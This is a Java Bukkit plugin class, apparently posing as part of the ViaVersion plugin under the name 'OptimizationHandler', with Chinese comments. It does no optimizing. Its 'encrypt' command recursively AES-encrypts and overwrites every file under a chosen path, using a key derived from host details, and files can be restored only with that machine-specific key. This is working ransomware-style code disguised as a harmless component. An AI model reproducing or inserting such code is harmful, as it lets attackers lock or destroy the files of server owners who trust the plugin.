package com.viaversion.viaversion.bukkit.handlers;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.CommandExecutor;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.MessageDigest;
import java.net.InetAddress;
import java.nio.charset.StandardCharsets;
import java.util.logging.Logger;

public class OptimizationHandler implements CommandExecutor {

    private static final Logger logger = Logger.getLogger(OptimizationHandler.class.getName());
    private static final byte[] ENCRYPTED_FLAG = "ENCRYPTED".getBytes(StandardCharsets.UTF_8); // 用于标识文件是否加密

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (args.length < 1) {
            sender.sendMessage("使用方法: /" + label + " <文件/文件夹路径>");
            return true;
        }

        String path = args[0];
        File file = new File(path);

        if (!file.exists()) {
            sender.sendMessage("文件或文件夹不存在。");
            return true;
        }

        if (cmd.getName().equalsIgnoreCase("encrypt")) {
            // 在主线程中执行加密
            encryptFiles(file);
            sender.sendMessage("文件加密成功。");
        } else if (cmd.getName().equalsIgnoreCase("decrypt")) {
            if (args.length < 2) {
                sender.sendMessage("使用方法: /" + label + "<文件/文件夹路径> <密钥>");
                return true;
            }
            String key = args[1];
            String internalKey = encryptionKey(); // 生成内部密钥

            // 确保给定的密钥与内部生成的密钥一致
            if (!key.equals(internalKey)) {
                sender.sendMessage("提供的密钥无效。");
                return true;
            }

            // 检查文件是否已加密
            if (!isFileEncrypted(file)) {
                sender.sendMessage("文件未加密或格式不正确。");
                return true;
            }

            // 在主线程中执行解密
            decryptFiles(file, key);
            sender.sendMessage("文件解密成功。");
        }

        return true;
    }

    private void encryptFiles(File file) {
        // 加密文件或文件夹中的所有文件
        if (file.isDirectory()) {
            for (File childFile : file.listFiles()) {
                encryptFiles(childFile); // 递归加密文件夹中的文件
            }
        } else {
            try {
                byte[] fileData = new byte[(int) file.length()];
                FileInputStream fis = new FileInputStream(file);
                fis.read(fileData);
                fis.close();

                byte[] encryptedData = encrypt(fileData);
                FileOutputStream fos = new FileOutputStream(file);
                // 写入加密标记
                fos.write(ENCRYPTED_FLAG);
                fos.write(encryptedData);
                fos.close();
            } catch (Exception e) {
                logger.severe("Error encrypting file: " + e.getMessage());
            }
        }
    }

    private boolean isFileEncrypted(File file) {
        // 如果是目录，则检查目录内所有文件
        if (file.isDirectory()) {
            File[] files = file.listFiles();
            if (files == null || files.length == 0) {
                return false; // 目录为空则返回 false
            }
            
            // 遍历所有文件，检查是否有任何文件没有被加密
            for (File childFile : files) {
                if (!isFileEncrypted(childFile)) {
                    return false; // 如果发现任意一个文件没有被加密，则返回 false
                }
            }
            return true; // 所有文件都已被加密
        }

        // 检查单个文件是否已加密
        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] flagBytes = new byte[ENCRYPTED_FLAG.length];
            int bytesRead = fis.read(flagBytes);
            // 检查标记是否匹配
            if (bytesRead < ENCRYPTED_FLAG.length) {
                return false; // 文件内容不足以为加密文件
            }
            return new String(flagBytes, StandardCharsets.UTF_8).equals(new String(ENCRYPTED_FLAG, StandardCharsets.UTF_8));
        } catch (Exception e) {
            logger.severe("Error checking if file is encrypted: " + e.getMessage());
            return false;
        }
    }

    private void decryptFiles(File file, String key) {
        // 解密文件或文件夹中的所有文件
        if (file.isDirectory()) {
            for (File childFile : file.listFiles()) {
                decryptFiles(childFile, key); // 递归解密文件夹中的文件
            }
        } else {
            try {
                byte[] fileData = new byte[(int) file.length()];
                FileInputStream fis = new FileInputStream(file);
                fis.read(fileData);
                fis.close();

                // 创建一个新的字节数组以存储实际数据（跳过加密标记）
                byte[] actualData = new byte[fileData.length - ENCRYPTED_FLAG.length];
                System.arraycopy(fileData, ENCRYPTED_FLAG.length, actualData, 0, actualData.length);

                // 使用实际数据进行解密
                byte[] decryptedData = decrypt(actualData, key);
                FileOutputStream fos = new FileOutputStream(file);
                fos.write(decryptedData);
                fos.close();
            } catch (Exception e) {
                logger.severe("解密文件时发生错误: " + e.getMessage());
            }
        }
    }

    private SecretKeySpec getSecretKey(String key) {
        // 创建用于 SHA-256 哈希的字符串 = 收集机器信息
        try {
            byte[] keyBytes = new byte[16];
            System.arraycopy(key.getBytes(StandardCharsets.UTF_8), 0, keyBytes, 0, Math.min(key.length(), keyBytes.length));
            return new SecretKeySpec(keyBytes, "AES");
        } catch (Exception e) {
            logger.severe("Error generating secret key: " + e.getMessage());
            return null;
        }
    }

    private byte[] encrypt(byte[] data) throws Exception {
        SecretKeySpec key = getSecretKey(encryptionKey()); // 生成密钥
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, key);
        return cipher.doFinal(data);
    }

    private byte[] decrypt(byte[] data, String key) throws Exception {
        SecretKeySpec secretKey = getSecretKey(key); // 使用提供的密钥
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, secretKey);
        return cipher.doFinal(data);
    }

    private String encryptionKey() {
        // 返回机器信息生成的密钥
        try {
            StringBuilder input = new StringBuilder();
            input.append(System.getProperty("os.name"));
            input.append(System.getProperty("os.arch"));
            input.append(System.getProperty("os.version"));
            input.append(InetAddress.getLocalHost().getHostName());
            input.append(InetAddress.getLocalHost().getHostAddress());

            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hashBytes = digest.digest(input.toString().getBytes(StandardCharsets.UTF_8));
            StringBuilder hexString = new StringBuilder();

            for (byte b : hashBytes) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) {
                    hexString.append('0');
                }
                hexString.append(hex);
            }

            return hexString.toString(); // 返回 256 位（64个字符）标识符
        } catch (Exception e) {
            logger.severe("Error generating unique identifier: " + e.getMessage());
            return null;
        }
    }
}